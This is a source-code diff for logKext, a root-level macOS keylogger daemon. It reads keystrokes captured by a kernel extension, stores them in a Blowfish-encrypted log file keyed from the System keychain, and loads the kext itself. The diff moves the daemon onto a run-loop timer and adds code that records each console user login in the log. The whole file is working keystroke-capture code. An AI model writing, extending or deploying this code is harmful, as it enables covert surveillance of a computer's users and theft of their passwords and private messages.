@@ -28,27 +28,38 @@
 #include <IOKit/IOKitLib.h>
 #include <CoreFoundation/CoreFoundation.h>
 #include <Security/Security.h>
+#include <SystemConfiguration/SystemConfiguration.h>
 
 #include "logKextDaemon.h"
 #include "logKextCommon.h"
 
-#define NOT_LOGGING_SLEEP	10
 #define TIME_TO_SLEEP		2
+#define PATHNAME_PREF_KEY	CFSTR("Pathname")
+#define ENCRYPT_PREF_KEY	CFSTR("Encrypt")
+#define PASSWORD_PREF_KEY	CFSTR("Password")
+#define MINMEG_PREF_KEY		CFSTR("MinMeg")
+#define SYSTEM_KEYCHAIN		"/Library/Keychains/System.keychain"
+#define SECRET_SERVICENAME	"logKextPassKey"
 
 /**********Function Declarations*************/
 
-void write_buffer(CFStringRef);
-int load_kext();
-bool outOfSpace(CFStringRef);
-void stamp_file(CFStringRef);
-bool fileExists(CFStringRef);
-void updateEncryption();
-void updateKeymap();
+void		write_buffer(CFStringRef);
+int			load_kext();
+bool		outOfSpace(CFStringRef);
+void		stamp_file(CFStringRef);
+bool		fileExists(CFStringRef);
+void		makeEncryptKey(CFStringRef pass);
 
-void getBufferSizeAndKeys(int *size,int *keys);
-CFStringRef getBuffer();
-bool connectToKext();
-void makeEncryptKey(CFStringRef pass);
+void		updateEncryption();
+void		updateKeymap();
+
+void		getBufferSizeAndKeys(int *size,int *keys);
+CFStringRef	getBuffer();
+bool		connectToKext();
+
+void		DaemonTimerCallback( CFRunLoopTimerRef timer, void *info );
+int			InstallLoginLogoutNotifiers(CFRunLoopSourceRef* RunloopSourceReturned);
+void		LoginLogoutCallBackFunction(SCDynamicStoreRef store, CFArrayRef changedKeys, void * info);
 
 /****** Globals ********/
 io_connect_t		userClient;
@@ -59,28 +70,26 @@ CFDictionaryRef		keymap;
 CFBooleanRef		doEncrypt;
 BF_KEY				encrypt_bf_key;
 CFBooleanRef		showMods;
+CFStringRef			pathName;
 
 /****** Main ********/
 
 int main()
 {
-	int error=noErr;
-
 	if (geteuid())
 	{
 		syslog(LOG_ERR,"Error: Daemon must run as root.");
 		exit(geteuid());
 	}
-	
+
 	encrypt_buffer = CFDataCreateMutable(kCFAllocatorDefault,8);
 	
 /*********Set up File**********/
 
-	CFStringRef pathName = (CFStringRef)CFPreferencesCopyAppValue(CFSTR("Pathname"),PREF_DOMAIN);
-	if (!pathName)
+	if (!(pathName = (CFStringRef)CFPreferencesCopyAppValue(PATHNAME_PREF_KEY,PREF_DOMAIN)))
 	{
 		pathName = CFSTR(DEFAULT_PATHNAME);
-		CFPreferencesSetAppValue(CFSTR("Pathname"),pathName,PREF_DOMAIN);
+		CFPreferencesSetAppValue(PATHNAME_PREF_KEY,pathName,PREF_DOMAIN);
 	}
 
 	CFURLRef logPathURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false);	
@@ -103,7 +112,7 @@ int main()
 	if (outOfSpace(pathName))
 	{
 		stamp_file(CFSTR("Not enough disk space remaining!"));
-		return 1;
+		CFRunLoopStop(CFRunLoopGetCurrent());
 	}
 
 /*********Connect to kernel extension**********/
@@ -124,138 +133,145 @@ int main()
 	sleep(1);		// just a little time to let the kernel notification handlers finish
 	
 	stamp_file(CFSTR("LogKext Daemon starting up"));
+	// stamp login file with initial user
+	LoginLogoutCallBackFunction(NULL, NULL, NULL);
 	
 	CFPreferencesAppSynchronize(PREF_DOMAIN);
 	
-/*********Daemon run loop**********/
+/*********Create Daemon Timer source**********/
 
-	while (1)
-	{
+	CFRunLoopTimerContext timerContext = { 0 };
+	CFRunLoopSourceRef loginLogoutSource;	
+    if (InstallLoginLogoutNotifiers(&loginLogoutSource))
+		syslog(LOG_ERR,"Error: could not install login notifier");
+	else
+		CFRunLoopAddSource(CFRunLoopGetCurrent(),loginLogoutSource, kCFRunLoopDefaultMode);
 
+	CFRunLoopTimerRef daemonTimer = CFRunLoopTimerCreate(NULL, 0, TIME_TO_SLEEP, 0, 0, DaemonTimerCallback, &timerContext);
+	CFRunLoopAddTimer(CFRunLoopGetCurrent(), daemonTimer, kCFRunLoopCommonModes);
+
+	
+	CFRunLoopRun();
+	
+	stamp_file(CFSTR("Server error: closing Daemon"));	
+	CFWriteStreamClose(logStream);
+}
+
+
+void DaemonTimerCallback( CFRunLoopTimerRef timer, void *info )
+{
 /*********Wait if not logging**********/
 
-		Boolean validKey;
-		CFPreferencesAppSynchronize(PREF_DOMAIN);
-		CFBooleanRef isLogging = (CFPreferencesGetAppBooleanValue(CFSTR("Logging"),PREF_DOMAIN,&validKey))?kCFBooleanTrue:kCFBooleanFalse;
-		if (!validKey)
-		{
-			isLogging = kCFBooleanTrue;
-			CFPreferencesSetAppValue(CFSTR("Logging"),isLogging,PREF_DOMAIN);
-		}
-		
-		if (!CFBooleanGetValue(isLogging))
-		{
-			sleep(NOT_LOGGING_SLEEP);
-			continue;
-		}
-		
+	Boolean validKey;
+	CFPreferencesAppSynchronize(PREF_DOMAIN);
+	CFBooleanRef isLogging = (CFPreferencesGetAppBooleanValue(CFSTR("Logging"),PREF_DOMAIN,&validKey))?kCFBooleanTrue:kCFBooleanFalse;
+	if (!validKey)
+	{
+		isLogging = kCFBooleanTrue;
+		CFPreferencesSetAppValue(CFSTR("Logging"),isLogging,PREF_DOMAIN);
+	}
+	
+	if (!CFBooleanGetValue(isLogging))
+		return;
+	
 /********* Check the buffer **********/
 
-		int buffsize=0;
-		int keys=0;
-		getBufferSizeAndKeys(&buffsize,&keys);
+	int buffsize=0;
+	int keys=0;
+	getBufferSizeAndKeys(&buffsize,&keys);
 
-		#ifdef DEBUG
-			syslog(LOG_ERR,"Buffsize %d, Keys %d.",buffsize,keys);	
-		#endif
+	#ifdef DEBUG
+		syslog(LOG_ERR,"Buffsize %d, Keys %d.",buffsize,keys);	
+	#endif
 
-		if (!keys)			// no keyboards logged
-			return 2;
+	if (!keys)			// no keyboards logged
+		return;
 
-		if (buffsize < MAX_BUFF_SIZE/10)
-		{
-			sleep(TIME_TO_SLEEP);
-			continue;
-		}
+	if (buffsize < MAX_BUFF_SIZE/10)
+		return;
 
 /********* Get the buffer **********/
 
-		CFStringRef the_buffer = getBuffer();
-		
+	CFStringRef the_buffer = getBuffer();
+	
 /********* Check defaults/file **********/		
-	
-		CFStringRef curPathName = (CFStringRef)CFPreferencesCopyAppValue(CFSTR("Pathname"),PREF_DOMAIN);
-		if (!curPathName)		// path has been deleted
+
+	CFStringRef curPathName = (CFStringRef)CFPreferencesCopyAppValue(PATHNAME_PREF_KEY,PREF_DOMAIN);
+	if (!curPathName)		// path has been deleted
+	{
+		pathName = CFSTR(DEFAULT_PATHNAME);
+		CFPreferencesSetAppValue(PATHNAME_PREF_KEY,pathName,PREF_DOMAIN);
+
+		logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false));
+
+		if (!logStream)
 		{
-			pathName = CFSTR(DEFAULT_PATHNAME);
-			CFPreferencesSetAppValue(CFSTR("Pathname"),pathName,PREF_DOMAIN);
-
-			logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false));
-
-			if (!logStream)
-			{
-				syslog(LOG_ERR,"Error: Couldn't open file stream while running.");	
-				return 1;
-			}
-
-
+			syslog(LOG_ERR,"Error: Couldn't open file stream while running.");	
+			return;
 		}
-		else if (CFStringCompare(curPathName,pathName,0)!=kCFCompareEqualTo)	// path has changed
-		{
-			pathName = curPathName;			
-			logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false));
+	}
+	else if (CFStringCompare(curPathName,pathName,0)!=kCFCompareEqualTo)	// path has changed
+	{
+		pathName = curPathName;			
+		logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false));
 
-			if (!logStream)
-			{
-				syslog(LOG_ERR,"Error: Couldn't open file stream while running.");	
-				return 1;
-			}
-			
-			CFDataDeleteBytes(encrypt_buffer,CFRangeMake(0,CFDataGetLength(encrypt_buffer)));
+		if (!logStream)
+		{
+			syslog(LOG_ERR,"Error: Couldn't open file stream while running.");	
+			return;
 		}
+		
+		CFDataDeleteBytes(encrypt_buffer,CFRangeMake(0,CFDataGetLength(encrypt_buffer)));
+	}
 
-		if (!fileExists(pathName))		// when file is deleted, we resync the encryption & keymap preferences
+	if (!fileExists(pathName))		// when file is deleted, we resync the encryption & keymap preferences
+	{
+		CFPreferencesAppSynchronize(PREF_DOMAIN);
+		updateEncryption();
+		updateKeymap();
+
+		logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false));
+		if (!logStream)
 		{
-			CFPreferencesAppSynchronize(PREF_DOMAIN);
-			updateEncryption();
-			updateKeymap();
-	
-			logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false));
-
-			if (!logStream)
-			{
-				syslog(LOG_ERR,"Error: Couldn't open file stream while running.");	
-				return 1;
-			}
-
-			stamp_file(CFSTR("LogKext Daemon created new logfile"));
+			syslog(LOG_ERR,"Error: Couldn't open file stream while running.");	
+			return;
 		}
 
-		if (outOfSpace(pathName))
-		{
-			stamp_file(CFSTR("Not enough disk space remaining!"));
-			break;
-		}
+		stamp_file(CFSTR("LogKext Daemon created new logfile"));
+	}
+
+	if (outOfSpace(pathName))
+	{
+		stamp_file(CFSTR("Not enough disk space remaining!"));
+		return;
+	}
 
 /********* Finally, write the buffer **********/
 
-		write_buffer(the_buffer);
-		CFRelease(the_buffer);		
-	}
-
-	stamp_file(CFSTR("Server error: closing Daemon"));	
-	CFWriteStreamClose(logStream);
+	write_buffer(the_buffer);
+	CFRelease(the_buffer);		
 	
-	return error;
+	return;
 }
 
 int load_kext()
 {
-    int childStatus = 0;
-    pid_t pid = fork();
-    if (!pid)
+    int		childStatus=0;
+    pid_t	pid;
+
+    if (!(pid = fork()))
 	{
 		execl("/sbin/kextload", "/sbin/kextload", "-b", KEXT_ID, NULL);
 		_exit(0);
 	}
-
 	waitpid(pid, &childStatus, 0);
-		
 	return childStatus;
 }
 
 void updateKeymap()
 {
+	CFReadStreamRef	readStream;
+
 	if (!fileExists(CFSTR(KEYMAP_PATH)))
 	{
 		stamp_file(CFSTR("Error: Keymap file is missing"));
@@ -263,7 +279,7 @@ void updateKeymap()
 		return;
 	}
 	
-	CFReadStreamRef readStream = CFReadStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,CFSTR(KEYMAP_PATH),kCFURLPOSIXPathStyle,false));
+	readStream = CFReadStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,CFSTR(KEYMAP_PATH),kCFURLPOSIXPathStyle,false));
 	if (!readStream||!(CFReadStreamOpen(readStream)))
 	{
 		stamp_file(CFSTR("Error: Can't open keymap file"));
@@ -289,64 +305,58 @@ void updateKeymap()
 
 void updateEncryption()
 {
-	Boolean validKey;
-	doEncrypt = (CFPreferencesGetAppBooleanValue(CFSTR("Encrypt"),PREF_DOMAIN,&validKey))?kCFBooleanTrue:kCFBooleanFalse;
+	Boolean			validKey;
+	CFStringRef		password;
+	unsigned char	md5[16];
+	char			hash[32];
+	
+	doEncrypt = (CFPreferencesGetAppBooleanValue(ENCRYPT_PREF_KEY,PREF_DOMAIN,&validKey))?kCFBooleanTrue:kCFBooleanFalse;
 	if (!validKey)
 	{
 		doEncrypt = kCFBooleanTrue;
-		CFPreferencesSetAppValue(CFSTR("Encrypt"),doEncrypt,PREF_DOMAIN);
+		CFPreferencesSetAppValue(ENCRYPT_PREF_KEY,doEncrypt,PREF_DOMAIN);
 	}
 	
-	CFStringRef password = (CFStringRef)CFPreferencesCopyAppValue(CFSTR("Password"),PREF_DOMAIN);
-	if (!password)
+	if (!(password = (CFStringRef)CFPreferencesCopyAppValue(PASSWORD_PREF_KEY,PREF_DOMAIN)))
 	{
-		password = CFSTR(DEFAULT_PASSWORD);
-		
-		unsigned char md5[16];
+		password = CFSTR(DEFAULT_PASSWORD);		
 		MD5((const unsigned char*)CFStringGetCStringPtr(password,CFStringGetFastestEncoding(password)),CFStringGetLength(password),md5);
-		char hash[32];
-		for (int i=0; i< 16; i++) 
+		for (int i=0; i<sizeof(md5); i++) 
 			sprintf(hash+2*i,"%02x",md5[i]);
 		password = CFStringCreateWithCString(kCFAllocatorDefault,hash,kCFStringEncodingASCII);
 		
-		CFPreferencesSetAppValue(CFSTR("Password"),password,PREF_DOMAIN);
+		CFPreferencesSetAppValue(PASSWORD_PREF_KEY,password,PREF_DOMAIN);
 	}
 	makeEncryptKey(password);
 }
 
 void makeEncryptKey(CFStringRef pass)
 {
-	SecKeychainRef sysChain;
-	OSStatus secRes = SecKeychainOpen("/Library/Keychains/System.keychain", &sysChain);
-	if (secRes)
-	{
-		printf("Couldn't get system keychain: %d\n",secRes);
-		return;
-	}
+	UInt32				passLen;
+	unsigned char		*passData;
 
-	UInt32 passLen;
-	void* passData;
-	SecKeychainItemRef itemRef=NULL;
-	secRes = SecKeychainFindGenericPassword(sysChain, strlen("logKextPassKey"), "logKextPassKey", 0, NULL, &passLen, &passData, &itemRef);
-	if (secRes)
+	SecKeychainItemRef	itemRef=NULL;
+	SecKeychainRef		sysChain;
+	OSStatus			secRes;
+	
+	BF_KEY				temp_key;
+	unsigned char		encrypt_key[8];	
+	
+	if ((secRes = SecKeychainOpen(SYSTEM_KEYCHAIN, &sysChain)) != 0)
 	{
-		syslog(LOG_ERR,"Error finding passKey in keychain (%d). Failing",secRes);
+		syslog(LOG_ERR,"Couldn't get system keychain: %d\n",secRes);
 		exit(-1);
 	}
-/*	
-	syslog(LOG_ERR,"Using encryption key %02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x\n",
-		((char*)passData)[0]&0xff,((char*)passData)[1]&0xff,((char*)passData)[2]&0xff,((char*)passData)[3]&0xff,
-		((char*)passData)[4]&0xff,((char*)passData)[5]&0xff,((char*)passData)[6]&0xff,((char*)passData)[7]&0xff,
-		((char*)passData)[8]&0xff,((char*)passData)[9]&0xff,((char*)passData)[10]&0xff,((char*)passData)[11]&0xff,
-		((char*)passData)[12]&0xff,((char*)passData)[13]&0xff,((char*)passData)[14]&0xff,((char*)passData)[15]&0xff);
-*/		
+
+	if ((secRes = SecKeychainFindGenericPassword(sysChain, strlen(SECRET_SERVICENAME), SECRET_SERVICENAME, 0, NULL, &passLen, (void**)&passData, &itemRef))!=0)
+	{
+		syslog(LOG_ERR,"Error finding secret in keychain (%d). Failing",secRes);
+		exit(-1);
+	}
 	
-	BF_KEY temp_key;
-	BF_set_key(&temp_key,passLen,(unsigned char*)passData);
-	unsigned char *encrypt_key = new unsigned char[8];
+	BF_set_key(&temp_key,passLen,passData);
 	BF_ecb_encrypt((const unsigned char*)CFStringGetCStringPtr(pass,CFStringGetFastestEncoding(pass)),encrypt_key,&temp_key,BF_ENCRYPT);
-	BF_set_key(&encrypt_bf_key,8,encrypt_key);
-	
+	BF_set_key(&encrypt_bf_key,8,encrypt_key);	
 	return;
 }
 
@@ -360,21 +370,21 @@ bool fileExists(CFStringRef pathName)
 
 bool outOfSpace(CFStringRef pathName)
 {
-	Boolean validKey;
-	int minMeg = CFPreferencesGetAppIntegerValue(CFSTR("MinMeg"),PREF_DOMAIN,&validKey);
+	Boolean			validKey;
+	unsigned int	minMeg;
+	struct statfs	fileSys;
+	
+	minMeg = CFPreferencesGetAppIntegerValue(MINMEG_PREF_KEY,PREF_DOMAIN,&validKey);
 	if (!validKey)
 	{
 		minMeg = DEFAULT_MEG;
-		CFPreferencesSetAppValue(CFSTR("MinMeg"),CFNumberCreate(kCFAllocatorDefault,kCFNumberIntType,&minMeg),PREF_DOMAIN);
+		CFPreferencesSetAppValue(MINMEG_PREF_KEY,CFNumberCreate(kCFAllocatorDefault,kCFNumberIntType,&minMeg),PREF_DOMAIN);
 	}
 
-	struct statfs fileSys;
-	int error = statfs(CFStringGetCStringPtr(pathName,CFStringGetFastestEncoding(pathName)),&fileSys);
-	if (error)
+	if (statfs(CFStringGetCStringPtr(pathName,CFStringGetFastestEncoding(pathName)),&fileSys))
 		return false;
-	long megLeft = (fileSys.f_bsize/1024)*(fileSys.f_bavail/1024);
 
-	if (megLeft < minMeg)
+	if ((fileSys.f_bsize/1024)*(fileSys.f_bavail/1024) < minMeg)
 		return true;
 		
 	return false;
@@ -383,8 +393,13 @@ bool outOfSpace(CFStringRef pathName)
 void stamp_file(CFStringRef inStamp)
 {
 	time_t the_time;
+	char timeBuf[32]={0};
 	time(&the_time);
-	CFStringRef stamp = CFStringCreateWithFormat(kCFAllocatorDefault,NULL,CFSTR("\n%@ : %s"),inStamp,ctime(&the_time));
+	ctime_r(&the_time, timeBuf);
+	char* newlin=strchr(timeBuf, '\n');
+	if (newlin)
+		*newlin=0;
+	CFStringRef stamp = CFStringCreateWithFormat(kCFAllocatorDefault,NULL,CFSTR("\n![%@ : %s]\n"),inStamp,timeBuf);
 	write_buffer(stamp);
 }
 
@@ -407,16 +422,15 @@ void write_buffer(CFStringRef inData)
 	}
 
 	int buff_pos = 0;
-
 	while (1)
 	{	
-		int avail_space = 8-CFDataGetLength(encrypt_buffer);					//space rem in buffer
-		int rem_to_copy = CFStringGetLength(inData)-buff_pos;					//stuff in data that needs to be copied
-		int to_copy = rem_to_copy<avail_space?rem_to_copy:avail_space;			//amount left to encryp, or avail space
+		int avail_space =	8-CFDataGetLength(encrypt_buffer);					//space rem in buffer
+		int rem_to_copy =	CFStringGetLength(inData)-buff_pos;					//stuff in data that needs to be copied
+		int to_copy =		rem_to_copy<avail_space?rem_to_copy:avail_space;	//amount left to encryp, or avail space
 		
 		if (avail_space)
 		{	
-			UInt8 tmp_buff[to_copy];
+			UInt8 tmp_buff[8];
 			CFStringGetBytes(inData,CFRangeMake(buff_pos,to_copy),kCFStringEncodingNonLossyASCII,0,false,tmp_buff,8,NULL);
 			CFDataAppendBytes(encrypt_buffer,tmp_buff,to_copy);
 			
@@ -442,7 +456,6 @@ void write_buffer(CFStringRef inData)
 
 bool connectToKext()
 {
-	kern_return_t	kernResult; 
     mach_port_t		masterPort;
     io_service_t	serviceObject = 0;
     io_iterator_t 	iterator;
@@ -450,18 +463,15 @@ bool connectToKext()
 	Boolean			result = true;	// assume success
     
     // return the mach port used to initiate communication with IOKit
-    kernResult = IOMasterPort(MACH_PORT_NULL, &masterPort);
-    if (kernResult != KERN_SUCCESS)
+    if (IOMasterPort(MACH_PORT_NULL, &masterPort) != KERN_SUCCESS)
 		return false;
     
     classToMatch = IOServiceMatching( "com_fsb_iokit_logKext" );
     if (!classToMatch)
 		return false;
 
-    // create an io_iterator_t of all instances of our driver's class
-	// that exist in the IORegistry
-    kernResult = IOServiceGetMatchingServices(masterPort, classToMatch, &iterator);
-    if (kernResult != KERN_SUCCESS)
+    // create an io_iterator_t of all instances of our driver's class that exist in the IORegistry
+    if (IOServiceGetMatchingServices(masterPort, classToMatch, &iterator) != KERN_SUCCESS)
 		return false;
 			    
     // get the first item in the iterator.
@@ -476,13 +486,12 @@ bool connectToKext()
     }
 	
 	// instantiate the user client
-    kernResult = IOServiceOpen(serviceObject, mach_task_self(), 0, &userClient);
-	if(kernResult != KERN_SUCCESS) {
+	if(IOServiceOpen(serviceObject, mach_task_self(), 0, &userClient) != KERN_SUCCESS) {
 		result = false;
 		goto bail;
     }
 	
-	bail:
+bail:
 	if (serviceObject) {
 		IOObjectRelease(serviceObject);
 	}
@@ -585,4 +594,61 @@ CFStringRef getBuffer()
 	}
 
 	return decodedData;
+}
+
+
+
+void LoginLogoutCallBackFunction(SCDynamicStoreRef store, CFArrayRef changedKeys, void * info)
+{
+    CFStringRef	consoleUserName;
+    consoleUserName = SCDynamicStoreCopyConsoleUser(store, NULL, NULL);
+    if (consoleUserName != NULL)
+    {
+		stamp_file(CFStringCreateWithFormat(NULL, NULL, CFSTR("User '%@' has logged in"), consoleUserName));
+        CFRelease(consoleUserName);
+    }
+}
+
+int InstallLoginLogoutNotifiers(CFRunLoopSourceRef* RunloopSourceReturned)
+{
+    SCDynamicStoreContext DynamicStoreContext = { 0, NULL, NULL, NULL, NULL };
+    SCDynamicStoreRef DynamicStoreCommunicationMechanism = NULL;
+    CFStringRef KeyRepresentingConsoleUserNameChange = NULL;
+    CFMutableArrayRef ArrayOfNotificationKeys;
+    Boolean Result;
+
+    *RunloopSourceReturned = NULL;
+    DynamicStoreCommunicationMechanism = SCDynamicStoreCreate(NULL, CFSTR("logKext"), LoginLogoutCallBackFunction, &DynamicStoreContext);
+
+    if (DynamicStoreCommunicationMechanism == NULL)
+        return(-1); //unable to create dynamic store.
+
+    KeyRepresentingConsoleUserNameChange = SCDynamicStoreKeyCreateConsoleUser(NULL);
+    if (KeyRepresentingConsoleUserNameChange == NULL)
+    {
+        CFRelease(DynamicStoreCommunicationMechanism);
+        return(-2);
+    }
+
+    ArrayOfNotificationKeys = CFArrayCreateMutable(NULL, (CFIndex)1, &kCFTypeArrayCallBacks);
+    if (ArrayOfNotificationKeys == NULL)
+    {
+        CFRelease(DynamicStoreCommunicationMechanism);
+        CFRelease(KeyRepresentingConsoleUserNameChange);
+        return(-3);
+    }
+    CFArrayAppendValue(ArrayOfNotificationKeys, KeyRepresentingConsoleUserNameChange);
+
+     Result = SCDynamicStoreSetNotificationKeys(DynamicStoreCommunicationMechanism, ArrayOfNotificationKeys, NULL);
+     CFRelease(ArrayOfNotificationKeys);
+     CFRelease(KeyRepresentingConsoleUserNameChange);
+
+     if (Result == FALSE) //unable to add keys to dynamic store.
+     {
+        CFRelease(DynamicStoreCommunicationMechanism);
+        return(-4);
+     }
+
+	*RunloopSourceReturned = SCDynamicStoreCreateRunLoopSource(NULL, DynamicStoreCommunicationMechanism, (CFIndex) 0);
+    return(0);
 }
